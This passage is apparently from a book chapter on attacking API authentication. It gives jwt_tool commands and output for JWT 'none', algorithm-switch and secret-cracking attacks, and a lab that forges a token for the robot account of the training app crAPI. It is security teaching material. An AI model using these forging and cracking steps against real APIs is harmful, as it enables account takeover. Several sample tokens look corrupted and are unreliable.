&quot;root&quot;,</span></p><p class="c9"><span class="c3">&nbsp; &nbsp;&quot;iat&quot;: 1516239022</span></p><p class="c17"><span class="c3">}</span></p><p class="c7"><span class="c1">Once you&rsquo;ve edited the payload, use Burp Suite&rsquo;s Decoder to encode the payload with base64; then insert it into the JWT. Importantly, since the algorithm is set to </span><span class="c29">&quot;none&quot;</span><span class="c1 c12">, any signature that was present can be removed. In other words, you can remove everything following the third period in the JWT. Send the JWT to the provider in a request and check whether you&rsquo;ve gained unauthorized access to the API.</span></p><h3 class="c26 c19" id="h.n5ktkg7a2ehu"><span class="c15 c12">The Algorithm Switch Attack</span></h3><p class="c23 c19"><span class="c1 c12">There is a chance the API provider isn&rsquo;t checking the JWTs properly. If this is the case, we may be able to trick a provider into accepting a JWT with an altered algorithm.</span></p><p class="c7"><span class="c1 c12">One of the first things you should attempt is sending a JWT without including the signature. This can be done by erasing the signature altogether and leaving the last period in place, like this:</span></p><p class="c17"><span class="c3">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJoYWNrYXBpcy5pbyIsImV4cCI6IDE1ODM2Mzc0ODgsInVzZXJuYW1lIjoiU2N1dHRsZXBoMXNoIiwic3VwZXJhZG1pbiI6dHJ1ZX0.</span></p><p class="c7"><span class="c1">If this isn&rsquo;t successful, attempt to alter the algorithm header field to </span><span class="c29">&quot;none&quot;</span><span class="c1">. Decode the JWT, updating the </span><span class="c29">&quot;alg&quot;</span><span class="c1">&nbsp;value to </span><span class="c29">&quot;none&quot;</span><span class="c1 c12">, base64-encode the header, and send it to the provider. If successful, pivot to the None attack.</span></p><p class="c9"><span class="c3">{</span></p><p class="c9"><span class="c3">&quot;alg&quot;: &quot;none&quot;</span></p><p class="c9"><span class="c3">&quot;typ&quot;: &quot;JWT&quot;</span></p><p class="c17"><span class="c3">}</span></p><p class="c7"><span class="c1">You can use JWT_Tool to create a variety of tokens with the algorithm set to </span><span class="c29">&quot;none&quot;</span><span class="c1 c12">:</span></p><p class="c17"><span class="c31">$ </span><span class="c20 c12">jwt_tool &lt;JWT_Token&gt; -X a</span></p><p class="c7"><span class="c1 c12">Using this command will automatically create several JWTs that have different forms of &ldquo;no algorithm&rdquo; applied.</span></p><p class="c7"><span class="c1 c12">A more likely scenario than the provider accepting no algorithm is that they accept multiple algorithms. For example, if the provider uses RS256 but doesn&rsquo;t limit the acceptable algorithm values, we could alter the algorithm to HS256. This is useful, as RS256 is an asymmetric encryption scheme, meaning we need both the provider&rsquo;s private key and a public key in order to accurately hash the JWT signature. Meanwhile, HS256 is symmetric encryption, so only one key is used for both the signature and verification of the token. If you can discover the provider&rsquo;s RS256 public key and then switch the algorithm from RS256 to HS256, there is a chance you may be able to leverage the RS256 public key as the HS256 key.</span></p><p class="c7"><span class="c1">The JWT_Tool can make this attack a bit easier. It uses the format </span><span class="c29">jwt_tool &lt;JWT_Token&gt; -X k -pk public-key.pem</span><span class="c1 c12">, as shown next. You will need to save the captured public key as a file on your attacking machine.</span></p><p class="c9"><span class="c31">$ </span><span class="c20">jwt_tool eyJBeXAiOiJKV1QiLCJhbGciOiJSUZI1Ni 19.eyJpc3MiOi JodHRwOlwvxC9kZW1vLnNqb2VyZGxhbmdrzwiwZXIubmxcLyIsIm1hdCI6MTYYCJkYXRhIjp7ImhlbGxvijoid29ybGQifx0.MBZKIRF_MvG799nTKOMgdxva_S-dqsVCPPTR9N9L6q2_10152pHq2YTRafwACdgyhR1A2Wq7wEf4210929BTWsVk19_XkfyDh_Tizeszny_GGsVzdb103NCITUEjFRXURJ0-MEETROOC-TWB8n6wOTOjWA6SLCEYANSKWaJX5XvBt6HtnxjogunkVz2sVp3 VFPevfLUGGLADKYBphfumd7jkh80ca2lvs8TagkQyCnXq5VhdZsoxkETHwe_n7POBISAZYSMayihlweg -x k-pk public-key-pem</span></p><p class="c9"><span class="c3">Original JWT:</span></p><p class="c9"><span class="c3">File loaded: public-key. pem</span></p><p class="c9"><span class="c3">jwttool_563e386e825d299e2fc@aadaeec25269 - EXPLOIT: Key-Confusion attack (signing using the Public key as the HMAC secret)</span></p><p class="c9"><span class="c3">(This will only be valid on unpatched implementations of JWT.)</span></p><p class="c17"><span class="c3">[+] ey JoexAiOiJK1QiLCJhbGciOiJIUZI1NiJ9.eyJpc3MiOiJodHRwOi8vZGVtby5zam91cmRsYW5na2VtcGVyLmSsLyIsIm1hdCI6MTYyNTc4NzkzOSwizhlbGxvIjoid29ybGQifxo.gyti NhqYsSiDIn10e-6-6SfNPJle-9EZbJZjhaa30</span></p><p class="c7"><span class="c1 c12">Once you run the command, JWT_Tool will provide you with a new token to use against the API provider. If the provider is vulnerable, you&rsquo;ll be able to hijack other tokens, since you now have the key required to sign tokens. Try repeating the process, this time creating a new token based on other API users, especially administrative ones.</span></p><h3 class="c26 c19" id="h.l283pu8g6mqw"><span class="c15 c12">The JWT Crack Attack</span></h3><p class="c23 c19"><span class="c1 c12">The JWT Crack attack attempts to crack the secret used for the JWT signature hash, giving us full control over the process of creating our own valid JWTs. Hash-cracking attacks like this take place offline and do not interact with the provider. Therefore, we do not need to worry about causing havoc by sending millions of requests to an API provider.</span></p><p class="c7"><span class="c1 c12">You can use JWT_Tool or a tool like Hashcat to crack JWT secrets. You&rsquo;ll feed your hash cracker a list of words. The hash cracker will then hash those words and compare the values to the original hashed signature to determine if one of those words was used as the hash secret. If you&rsquo;re performing a long-term brute-force attack of every character possibility, you may want to use the dedicated GPUs that power Hashcat instead of JWT_Tool. That being said, JWT_Tool can still test 12 million passwords in under a minute.</span></p><p class="c7"><span class="c1 c12">To perform a JWT Crack attack using JWT_Tool, use the following command:</span></p><p class="c17"><span class="c31">$ </span><span class="c20 c12">jwt_tool &lt;JWT Token&gt; -C -d /wordlist.txt</span></p><p class="c7"><span class="c1">The </span><span class="c29">-C</span><span class="c1">&nbsp;option indicates that you&rsquo;ll be conducting a hash crack attack and the </span><span class="c29">-d</span><span class="c1">&nbsp;option specifies the dictionary or wordlist you&rsquo;ll be using against the hash. In this example, the name of my dictionary is </span><span class="c1 c14">wordlist.txt</span><span class="c1 c12">, but you can specify the directory and name of whatever wordlist you would like to use. JWT_Tool will either return &ldquo;CORRECT key!&rdquo; for each value in the dictionary or indicate an unsuccessful attempt with &ldquo;key not found in dictionary.&rdquo;</span></p><h2 class="c26 c19" id="h.owz45rnhx6ot"><span class="c16 c12">Summary</span></h2><p class="c23 c19"><span class="c1 c12">This chapter covered various methods of hacking API authentication, exploiting tokens, and attacking JSON Web Tokens specifically. When present, authentication is usually an API&rsquo;s first defense mechanism, so if your authentication attacks are successful, your unauthorized access can become a foothold for additional attacks.</span></p><h2 class="c26 c19" id="h.iyl551p09gx"><span class="c12 c41">Lab #5: Cracking a crAPI JWT Signature</span></h2><p class="c23 c19"><span class="c1 c12">Return to the crAPI authentication page to try your hand at attacking the authentication process. We know that this authentication process has three parts: account registration, password reset functionality, and the login operation. All three of these should be thoroughly tested. In this lab, we&rsquo;ll focus on attacking the token provided after a successful authentication attempt.</span></p><p class="c7"><span class="c1 c12">If you remember your crAPI login information, go ahead and log in. (Otherwise, sign up for a new account.) Make sure you have Burp Suite open and FoxyProxy set to proxy traffic to Burp so you can intercept the login request. Then forward the intercepted request to the crAPI provider. If you&rsquo;ve entered in your email and password correctly, you should receive an HTTP 200 response and a Bearer token.</span></p><p class="c7"><span class="c1">Hopefully, you now notice something special about the Bearer token. That&rsquo;s right: it is broken down into three parts separated by periods, and the first two parts begin with </span><span class="c29">ey</span><span class="c1">. We have ourselves a JSON Web Token! Let&rsquo;s begin by analyzing the JWT using a site like </span><span class="c21 c14"><a class="c24" href="https://www.google.com/url?q=https://jwt.io/&amp;sa=D&amp;source=editors&amp;ust=1681144468734591&amp;usg=AOvVaw0eQEqW-kYx0H8QVt3i-hlF">https://jwt.io</a></span><span class="c1">&nbsp;or JWT_Tool. For visual purposes, </span><span class="c21 c14"><a class="c24" href="https://www.google.com/url?q=https://learning.oreilly.com/library/view/hacking-apis/9781098130244/c08.xhtml%23figure8-14&amp;sa=D&amp;source=editors&amp;ust=1681144468735119&amp;usg=AOvVaw0Yj5_G7k1cr1LkdlMVVPWi">Figure 8-14</a></span><span class="c1 c12">&nbsp;shows the token in the JWT.io debugger.</span></p><p class="c22"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 609.33px; height: 446.67px;"><img alt="Screenshot of jwt.io with a long string in the &ldquo;Encoded&rdquo; field and each section of the JWT decoded in the &ldquo;Decoded&rdquo; field" src="images/image13.png" style="width: 609.33px; height: 446.67px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c0"><span class="c30 c13">Figure 8-14</span><span class="c10">: A captured JWT being analyzed in JWT.io&rsquo;s debugger</span></p><p class="c7"><span class="c1">As you can see, the JWT header tells us that the algorithm is set to HS512, an even stronger hash algorithm than those covered earlier. Also, the payload contains a </span><span class="c29">&quot;sub&quot;</span><span class="c1">&nbsp;value with our email. The payload also contains two values used for token expiration: </span><span class="c29">iat</span><span class="c1">&nbsp;and </span><span class="c29">exp</span><span class="c1 c12">. Finally, the signature confirms that HMAC+SHA512 is in use and that a secret key is required to sign the JWT.</span></p><p class="c7"><span class="c1 c12">A natural next step would be to conduct None attacks to try to bypass the hashing algorithm. I will leave that for you to explore on your own. We won&rsquo;t attempt any other algorithm switch attack, as we&rsquo;re already attacking a symmetric key encryption system, so switching the algorithm type won&rsquo;t benefit us here. That leaves us with performing JWT Crack attacks.</span></p><p class="c7"><span class="c1">To perform a Crack attack against your captured token, copy the token from the intercepted request. Open a terminal and run JWT_Tool. As a first-round attack, we can use the </span><span class="c1 c14">rockyou.txt</span><span class="c1 c12">&nbsp;file as our dictionary:</span></p><p class="c9"><span class="c31">$ </span><span class="c20">jwt_tool eyJhbGciOiJIUZUxMi19.eyJzdWIiOiJhQGVtYWlsLmNvbSIsImlhdCI6MTYYNTC4NzA4MywiZXhwIjoxNjI10DCzNDgzfQ. EYx8ae40nE2n9ec4yBPI6Bx0z0-BWuaUQVJg2Cjx_BD_-eT9-Rpn87IAU@QM8 -C -d rockyou.txt</span></p><p class="c9"><span class="c3">Original JWT:</span></p><p class="c9"><span class="c3">[*] Tested 1 million passwords so far</span></p><p class="c9"><span class="c3">[*] Tested 2 million passwords so far</span></p><p class="c9"><span class="c3">[*] Tested 3 million passwords so far</span></p><p class="c9"><span class="c3">[*] Tested 4 million passwords so far</span></p><p class="c9"><span class="c3">[*] Tested 5 million passwords so far</span></p><p class="c9"><span class="c3">[*] Tested 6 million passwords so far</span></p><p class="c9"><span class="c3">[*] Tested 7 million passwords so far</span></p><p class="c9"><span class="c3">[*] Tested 8 million passwords so far</span></p><p class="c9"><span class="c3">[*] Tested 9 million passwords so far</span></p><p class="c9"><span class="c3">[*] Tested 10 million passwords so far</span></p><p class="c9"><span class="c3">[*] Tested 11 million passwords so far</span></p><p class="c9"><span class="c3">[*] Tested 12 million passwords so far</span></p><p class="c9"><span class="c3">[*] Tested 13 million passwords so far</span></p><p class="c9"><span class="c3">[*] Tested 14 million passwords so far</span></p><p class="c17"><span class="c3">[-] Key not in dictionary</span></p><p class="c7"><span class="c1">At the beginning of this chapter, I mentioned that </span><span class="c1 c14">rockyou.txt</span><span class="c1">&nbsp;is outdated, so it likely won&rsquo;t yield any successes. Let&rsquo;s try brainstorming some likely secrets and save them to our own </span><span class="c1 c14">crapi.txt</span><span class="c1">&nbsp;file (see </span><span class="c21 c14"><a class="c24" href="https://www.google.com/url?q=https://learning.oreilly.com/library/view/hacking-apis/9781098130244/c08.xhtml%23table8-1&amp;sa=D&amp;source=editors&amp;ust=1681144468739500&amp;usg=AOvVaw2HFrcgXvA7CWCmAnVv-tdh">Table 8-1</a></span><span class="c1 c12">). You can also generate a similar list using a password profiler, as recommended earlier in this chapter.</span></p><p class="c0"><span class="c19 c28">Table 8-1</span><span class="c10">: Potential crAPI JWT Secrets</span></p><a id="t.c988f3a0fb23e4b9e7d4bbda356db6f9304808c7"></a><a id="t.0"></a><table class="c40"><tr class="c33"><td class="c5" colspan="1" rowspan="1"><p class="c11"><span class="c1 c19">Crapi2020</span></p></td><td class="c18" colspan="1" rowspan="1"><p class="c11"><span class="c1 c19">OWASP</span></p></td><td class="c2" colspan="1" rowspan="1"><p class="c11"><span class="c1 c19">iparc2022</span></p></td></tr><tr class="c33"><td class="c5" colspan="1" rowspan="1"><p class="c11"><span class="c1 c19">crapi2022</span></p></td><td class="c18" colspan="1" rowspan="1"><p class="c11"><span class="c1 c19">owasp</span></p></td><td class="c2" colspan="1" rowspan="1"><p class="c11"><span class="c1 c19">iparc2023</span></p></td></tr><tr class="c33"><td class="c5" colspan="1" rowspan="1"><p class="c11"><span class="c1 c19">crAPI2022</span></p></td><td class="c18" colspan="1" rowspan="1"><p class="c11"><span class="c1 c19">Jwt2022</span></p></td><td class="c2" colspan="1" rowspan="1"><p class="c11"><span class="c1 c19">iparc2020</span></p></td></tr><tr class="c33"><td class="c5" colspan="1" rowspan="1"><p class="c11"><span class="c1 c19">crAPI2020</span></p></td><td class="c18" colspan="1" rowspan="1"><p class="c11"><span class="c1 c19">Jwt2020</span></p></td><td class="c2" colspan="1" rowspan="1"><p class="c11"><span class="c1 c19">iparc2021</span></p></td></tr><tr class="c33"><td class="c5" colspan="1" rowspan="1"><p class="c11"><span class="c1 c19">crAPI2021</span></p></td><td class="c18" colspan="1" rowspan="1"><p class="c11"><span class="c1 c19">Jwt_2022</span></p></td><td class="c2" colspan="1" rowspan="1"><p class="c11"><span class="c1 c19">iparc</span></p></td></tr><tr class="c33"><td class="c5" colspan="1" rowspan="1"><p class="c11"><span class="c1 c19">crapi</span></p></td><td class="c18" colspan="1" rowspan="1"><p class="c11"><span class="c1 c19">Jwt_2020</span></p></td><td class="c2" colspan="1" rowspan="1"><p class="c11"><span class="c1 c19">JWT</span></p></td></tr><tr class="c33"><td class="c5" colspan="1" rowspan="1"><p class="c11"><span class="c1 c19">community</span></p></td><td class="c18" colspan="1" rowspan="1"><p class="c11"><span class="c1 c19">Owasp2021</span></p></td><td class="c2" colspan="1" rowspan="1"><p class="c11"><span class="c1 c19">jwt2020</span></p></td></tr></table><p class="c7"><span class="c1 c12">Now run this targeted hash crack attack using JWT_Tool:</span></p><p class="c9"><span class="c31">$ </span><span class="c20">jwt_tool eyJhbGciOiJIUzUxMi19.eyJzdwiOiJhQGVtYWlsLmNvbSIsImlhdCI6MTYYNTC4NzA4MywiZXhwIjoxNjI10DCzNDgzfQ. EYx8ae40nE2n9ec4yBPi6Bx0z0-BWuaWQVJg2Cjx_BD_-eT9-Rp 871Au@QM8-wsTZ5aqtxEYRd4zgGR51t5PQ -C -d crapi.txt</span></p><p class="c9"><span class="c3">Original JWT:</span></p><p class="c9"><span class="c3">[+] crapi is the CORRECT key!</span></p><p class="c9"><span class="c3">You can tamper/fuzz the token contents (-T/-I) and sign it using:</span></p><p class="c17"><span class="c3">python3 jwt_tool.py [options here] -5 HS512 -p &quot;crapi&quot;</span></p><p class="c7"><span class="c1">Great! We&rsquo;ve discovered that the crAPI JWT secret is </span><span class="c29">&quot;crapi&quot;</span><span class="c1 c12">.</span></p><p class="c7"><span class="c1">This secret isn&rsquo;t too useful unless we have email addresses of other valid users, which we&rsquo;ll need to forge their tokens. Luckily, we accomplished this at the end of Chapter 7&rsquo;s lab. Let&rsquo;s see if we can gain unauthorized access to the robot account. As you can see in </span><span class="c21 c14"><a class="c24" href="https://www.google.com/url?q=https://learning.oreilly.com/library/view/hacking-apis/9781098130244/c08.xhtml%23figure8-15&amp;sa=D&amp;source=editors&amp;ust=1681144468751162&amp;usg=AOvVaw16PVoBHuvaQ2t2DWeZm4kN">Figure 8-15</a></span><span class="c1 c12">, we use JWT.io to generate a token for the crAPI robot account.</span></p><p class="c22"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 562.67px; height: 398.67px;"><img alt="Screenshot of jwt.io with a long string in the &ldquo;Encoded&rdquo; field and each section of the JWT decoded in the &ldquo;Decoded field" src="images/image11.png" style="width: 562.67px; height: 398.67px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c0"><span class="c30 c13">Figure 8-15</span><span class="c10">: Using JWT.io to generate a token</span></p><p class="c7"><span class="c1 c12">Don&rsquo;t forget that the algorithm value of this token is HS512 and that you need to add the HS512 secret to the signature. Once the token is generated, you can copy it into a saved Postman request or into a request using Burp Suite&rsquo;s Repeater, and then you can send it to the API. If successful, you&rsquo;ll have hijacked the crAPI robot account. Congrats!</span></p><p class="c9 c34"><span class="c12 c42"></span></p></body></html>